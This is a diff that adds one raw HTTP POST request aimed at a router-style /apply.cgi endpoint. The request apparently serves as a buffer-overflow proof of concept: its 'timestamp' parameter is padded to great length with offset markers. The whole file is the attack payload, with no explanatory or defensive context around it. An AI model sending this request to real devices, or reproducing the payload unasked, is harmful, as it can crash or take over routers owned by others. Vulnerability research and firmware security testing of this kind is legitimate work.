@@ -1,0 +1,4 @@
+POST /apply.cgi?WPS_failure.htm timestamp= HTTP/1.1
+Content-Length: 193
+
+hidden_pppoe2_policy=wzqwzqwzq&submit_flag=wlan_adv&%20timestamp=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa
